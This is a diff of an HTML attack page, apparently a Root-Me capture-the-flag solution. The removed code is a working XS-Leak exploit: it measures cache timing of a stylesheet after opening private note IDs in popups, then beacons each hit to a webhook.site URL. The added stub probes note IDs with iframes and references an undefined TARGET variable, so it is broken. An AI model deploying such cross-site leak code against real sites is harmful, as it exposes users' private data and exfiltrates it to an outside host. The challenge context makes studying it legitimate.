@@ -1,84 +1,25 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>XS-Leak via CSS Cache</title>
 </head>
 <body>
-    <h1>Scanning notes...</h1>
     <div id="status"></div>
     <script>
-        const TARGET_BASE = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/';
-        const WEBHOOK = 'https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864';
-        const START_ID = 2805;
-        const END_ID = 3000;
-        const DELAY_MS = 800;
-        const POPUP_TIMEOUT = 1500;
-        const RESOURCE_URL = 'https://web-client-ch56.challenge01.root-me.org:58056/static/css/style.css';
+function tryId(i) {
+    const iframe = document.createElement("iframe");
 
-        function updateStatus(msg) {
-            const div = document.getElementById('status');
-            div.innerHTML += msg + '<br>';
-            console.log(msg);
-        }
+    iframe.onload = () => {
+        console.log("loaded:", i);
+    };
 
-        // Load the resource and return the time. If useCacheBuster, adds a random param to bypass cache.
-        async function measureResource(useCacheBuster = false) {
-            return new Promise((resolve) => {
-                const start = performance.now();
-                const link = document.createElement('link');
-                link.rel = 'stylesheet';
-                let url = RESOURCE_URL;
-                if (useCacheBuster) url += '?t=' + Date.now() + '_' + Math.random();
-                link.href = url;
-                link.onload = () => resolve(performance.now() - start);
-                link.onerror = () => resolve(performance.now() - start);
-                document.head.appendChild(link);
-                // Clean up after load
-                setTimeout(() => {
-                    if (link.parentNode) link.parentNode.removeChild(link);
-                }, 100);
-            });
-        }
+    iframe.onerror = () => {
+        console.log("error:", i);
+    };
 
-        async function openPopupAndCache(id) {
-            const url = TARGET_BASE + id;
-            const popup = window.open(url, '_blank');
-            if (!popup) return false;
-            await new Promise(r => setTimeout(r, POPUP_TIMEOUT));
-            popup.close();
-            return true;
-        }
-
-        async function run() {
-            updateStatus(`Scanning IDs ${START_ID}–${END_ID}...`);
-            for (let id = START_ID; id <= END_ID; id++) {
-                updateStatus(`Testing ID ${id}...`);
-                // Measure uncached time (with cache buster)
-                const uncached = await measureResource(true);
-                updateStatus(`  Uncached load: ${uncached.toFixed(2)} ms`);
-
-                // Open the note page in a popup
-                const opened = await openPopupAndCache(id);
-                if (!opened) {
-                    updateStatus(`  Popup blocked`);
-                    continue;
-                }
-
-                // Measure again without cache buster – should be fast if the page loaded the CSS
-                const cached = await measureResource(false);
-                updateStatus(`  Cached load: ${cached.toFixed(2)} ms`);
-
-                // If cached time is significantly faster, we have a hit
-                if (cached < uncached * 0.6) {
-                    updateStatus(`✅ HIT at ID ${id}`);
-                    new Image().src = `${WEBHOOK}?id=${id}&uncached=${uncached.toFixed(0)}&cached=${cached.toFixed(0)}`;
-                }
-                await new Promise(r => setTimeout(r, DELAY_MS));
-            }
-            updateStatus('Scan complete.');
-        }
-
-        run();
+    iframe.src = TARGET + i;
+    document.body.appendChild(iframe);
+}
+tryId(2810);
     </script>
 </body>
 </html>
